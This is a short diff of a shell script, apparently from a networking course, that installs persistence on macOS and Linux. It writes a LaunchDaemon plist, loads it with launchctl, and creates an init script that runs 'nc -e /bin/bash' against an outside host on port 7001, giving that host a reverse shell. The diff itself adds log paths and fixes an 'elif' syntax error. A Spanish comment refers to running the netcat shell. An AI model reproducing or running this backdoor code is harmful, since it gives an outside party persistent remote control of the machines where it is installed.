@@ -25,12 +25,20 @@
     <array>
         <string>/Libray/StartupItems/boot_preferences.sh</string>
     </array>
+
+    <key>StandardErrorPath</key>
+    <string>/tmp/AlTest1.err</string>
+
+    <key>StandardOutPath</key>
+    <string>/tmp/AlTest1.out</string>
+
     <key>KeepAlive</key>
     <true/>
+
 </dict>
 </plist>" > /Library/LaunchDaemons/com.http.request.plist
     launchctl load -w /Library/LaunchDaemons/com.http.request.plist #TODO Revisar que se necesite la linea 35, con esto talvez ya se ejecuta el NC.
-    elif[ "$platform" == "linux" ]; then
+    elif [ "$platform" == "linux" ]; then
     	echo "#!/bin/bash 
     	nc -e /bin/bash claseredes2.tk 7001" > /etc/init.d/boot_init.sh
     	chmod a+x /etc/init.d/boot_init.sh
